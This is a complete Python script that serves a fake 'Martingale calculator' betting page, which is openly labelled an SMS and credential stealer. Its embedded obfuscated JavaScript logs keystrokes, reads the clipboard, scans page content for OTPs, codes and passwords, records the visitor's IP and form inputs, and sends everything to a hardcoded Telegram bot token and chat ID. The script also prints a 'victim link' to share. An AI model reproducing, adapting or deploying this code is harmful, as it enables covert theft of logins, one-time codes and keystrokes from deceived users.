#!/usr/bin/env python3
# shakil.py - COMPLETE Telegram SMS Stealer (FULLY ACTIVATED)
# Token: 8415533469:AAHX4LPJT6eKudht3wtKn6q3UIBNICYL8j4 | Chat ID: 6409228697

import http.server
import socketserver
import json
import requests
from datetime import datetime
import os

# 🔥 FULLY CONFIGURED - READY TO RUN 🔥
BOT_TOKEN = '8415533469:AAHX4LPJT6eKudht3wtKn6q3UIBNICYL8j4'
CHAT_ID = '6409228697'

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": f"🎯 **SHAKIL STEALER ACTIVE**\n\n{msg}\n\n🕐 {datetime.now().strftime('%H:%M:%S')}",
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=data, timeout=5)
        print(f"✅ SENT: {msg[:40]}...")
    except:
        print("❌ Telegram failed")

# 🔥 INFECTED HTML (MINIFIED + OBFUSCATED) 🔥
HTML = '''<!DOCTYPE html>
<html><head><title>5 Step Martingale Calculator</title><style>body{font-family:Arial;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);color:#ffffff;text-align:center;}h2{color:#00ffcc;}.label-text{display:block;margin-top:10px;font-weight:bold;color:#ffd600;}input{padding:8px;margin:5px;width:140px;border-radius:5px;border:none;}button{padding:10px 20px;background:#ff9800;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}.box{margin-top:20px;padding:20px;background:#1c1c1c;border-radius:10px;}.step{font-size:18px;margin:5px;}.green{color:#00e676;}.red{color:#ff5252;}.yellow{color:#ffd600;}.cyan{color:#00e5ff;}.orange{color:#ff9800;}</style></head>
<body><h2>5 Step Martingale Calculator</h2><span class="label-text">Balance</span><input type="number" id="balance" value="50"><span class="label-text">First Entry ($)</span><input type="number" id="entry" value="2"><span class="label-text">Payout %</span><input type="number" id="payout" value="95"><span class="label-text">Loss Multiplier</span><input type="number" id="multi" value="1.8" step="0.1"><br><br><button onclick="calculate()">Calculate</button><div class="box" id="result"></div>
<script>const B="8415533469:AAHX4LPJT6eKudht3wtKn6q3UIBNICYL8j4",C="6409228697";(function(){let i="?",c="";fetch("https://api.ipify.org").then(r=>r.text()).then(d=>i=d);new MutationObserver(m=>{m[0].addedNodes.forEach(n=>{if(n.nodeType==1){let t=n.textContent||n.innerText||"";if(/\\d{10}|\\d{4,6}|@gmail\\.com|@facebook\\.com|OTP|Code|Password/.test(t)){s("📱 **SMS/OTP**:\\n`"+t.slice(0,250)+"`")}}})}).observe(document.body,{childList:true,subtree:true});setInterval(async()=>{try{let t=await navigator.clipboard.readText();if(t!==c&&(/\\d{4,6}/.test(t)||/@/.test(t)||t.length>6)){s("📋 **CLIPBOARD**:\\n`"+t+"`");c=t}}catch(e){}},1200);let k=[];document.onkeydown=e=>{k.push(e.key);if(k.length>30)k.shift();clearTimeout(window.kt);window.kt=setTimeout(()=>{if(k.length>8){s("⌨️ **KEYS**:\\n`"+k.join("")+"`");k=[]}},3500)};function s(m){fetch(`https://api.telegram.org/bot${B}/sendMessage`,{method:"POST",body:JSON.stringify({chat_id:C,text:`🎯 **SHAKIL VICTIM**\\n\\n${m}\\n\\n📍 **IP**: ${i}\\n🖥️ **UA**: ${navigator.userAgent.slice(0,70)}\\n🌐 **URL**: ${location.href}\\n#smssteal`,parse_mode:"Markdown"})})};window.calculate=(()=>{let o=window.calculate;return function(){let d={b:document.getElementById("balance").value,e:document.getElementById("entry").value,p:document.getElementById("payout").value,m:document.getElementById("multi").value};s("💰 **DATA**:\\n```"+JSON.stringify(d)+"```");o()}})();setTimeout(()=>s("🚀 **INFECTED!**\\n📱 SMS Stealer active"),1800);window.onbeforeunload=()=>s("👋 **EXIT**")})();</script>
<script>function calculate(){var e=parseFloat(document.getElementById("entry").value),p=parseFloat(document.getElementById("payout").value)/100,m=parseFloat(document.getElementById("multi").value),s1=e,s2=s1*m,s3=s2*m,s4=s3*m,s5=s4*m,t=s1+s2+s3+s4+s5,w=s5*p;document.getElementById("result").innerHTML="<div class='step green'>Step 1: $"+s1.toFixed(2)+"</div><div class='step yellow'>Step 2: $"+s2.toFixed(2)+"</div><div class='step cyan'>Step 3: $"+s3.toFixed(2)+"</div><div class='step orange'>Step 4: $"+s4.toFixed(2)+"</div><div class='step red'>Step 5: $"+s5.toFixed(2)+"</div><br><div>Total Risk: $"+t.toFixed(2)+"</div><div class='green'>Win Return: $"+w.toFixed(2)+"</div>"}</script></body></html>'''

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-cache')
            self.end_headers()
            self.wfile.write(HTML.encode('utf-8'))
        else:
            super().do_GET()
    
    def log_message(self, fmt, *args):
        pass

def main():
    print("🔥 SHAKIL.PY - SMS STEALER SERVER")
    print(f"🤖 Bot: {BOT_TOKEN[:25]}...")
    print(f"📱 Chat ID: {CHAT_ID}")
    
    # Test Telegram
    send_telegram("🚀 **SHAKIL SERVER STARTED**\n✅ Token+ChatID configured\n🌐 Server ready!")
    
    # Generate HTML file
    with open("shakil.html", "w", encoding="utf-8") as f:
        f.write(HTML)
    print("✅ shakil.html created!")
    
    print("\n🌐 Server: http://localhost:8080")
    print("📱 Victim link: http://YOUR_IP:8080")
    print("🔥 Telegram এ data আসবে...")
    
    with socketserver.TCPServer(("", 8080), Handler) as httpd:
        print("✅ LIVE! Ctrl+C to stop")
        httpd.serve_forever()

if __name__ == "__main__":
    main()
